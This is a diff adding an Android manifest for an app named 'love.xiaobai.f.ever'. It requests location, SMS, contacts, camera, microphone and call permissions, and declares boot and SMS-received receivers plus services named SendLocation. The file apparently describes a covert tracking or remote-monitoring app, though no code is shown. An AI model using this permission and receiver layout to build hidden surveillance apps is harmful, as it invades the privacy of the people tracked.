@@ -1,0 +1,154 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="love.xiaobai.f.ever"
+    android:versionCode="2"
+    android:versionName="5.21" >
+
+    <uses-sdk
+        android:minSdkVersion="14"
+        android:targetSdkVersion="18" />
+
+    <uses-feature android:name="android.hardware.telephony" />
+
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.USE_CREDENTIALS" />
+    <uses-permission android:name="android.permission.MANAGE_ACCOUNTS" />
+    <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS" />
+
+    <permission android:name="android.permission.BAIDU_LOCATION_SERVICE" >
+    </permission>
+
+    <uses-permission android:name="android.permission.BAIDU_LOCATION_SERVICE" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.INTERNET" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_MOCK_LOCATION" >
+    </uses-permission>
+    <!-- <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"></uses-permission> -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" >
+    </uses-permission>
+    <uses-permission android:name="com.android.launcher.permission.READ_SETTINGS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_GPS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <!-- SDK1.5需要android.permission.GET_TASKS权限判断本程序是否为当前运行的应用? -->
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.CAMERA" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.RECORD_AUDIO" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.BROADCAST_STICKY" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <!-- 来电消音 -->
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <!-- 通讯录 -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+
+    <application
+        android:name="love.xiaobai.server.DemoApplication"
+        android:icon="@drawable/ic_launcher"
+        android:label="@string/app_name" 
+        android:theme="@style/AppBaseTheme"
+        >
+        <activity
+            android:name="love.xiaobai.face.Lion"
+            android:label="@string/app_name" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <activity
+            android:name="love.xiaobai.face.MainActivity"
+            android:label="@string/app_name" >
+        </activity>
+        <activity
+            android:name="love.xiaobai.server.LocationOverlayDemo"
+            android:configChanges="orientation|keyboardHidden"
+            android:label="@string/demo_name_location"
+            android:screenOrientation="sensor" >
+        </activity>
+        <activity
+            android:name="love.xiaobai.server.GeoCoderDemo"
+            android:configChanges="orientation|keyboardHidden"
+            android:label="@string/demo_name_geocode"
+            android:screenOrientation="sensor" >
+        </activity>
+        <activity
+            android:name="love.xiaobai.face.Planb"
+            android:label="@string/app_name" >
+        </activity>
+        
+        <activity
+            android:name="love.xiaobai.server.BaseMapDemo"
+            android:configChanges="orientation|keyboardHidden"
+            android:label="@string/demo_name_basemap"
+            android:screenOrientation="sensor" >
+        </activity>
+        <activity
+            android:name="love.xiaobai.face.Plana"
+            android:label="@string/app_name" >
+        </activity>
+
+        <service
+            android:name="com.baidu.location.f"
+            android:enabled="true"
+            android:process=":remote" >
+        </service>
+
+        <!-- 开机广播 -->
+        <receiver android:name="love.xiaobai.server.ServiceOMP" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+        
+        <receiver android:name="love.xiaobai.server.ServiceS" >
+            <intent-filter>
+                <action android:name="android.provider.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        <activity
+            android:name="love.xiaobai.face.Nopage"
+            android:label="@string/app_name" >
+        </activity>
+
+        <service android:name="love.xiaobai.server.SendLocation" >
+        </service>
+        <service android:name="love.xiaobai.server.SendLocation2" >
+        </service>
+
+        <receiver android:name="love.xiaobai.server.ReceiveSMS" >
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+    </application>
+
+    <supports-screens
+        android:anyDensity="true"
+        android:largeScreens="true"
+        android:normalScreens="false"
+        android:resizeable="true"
+        android:smallScreens="true" />
+
+</manifest>
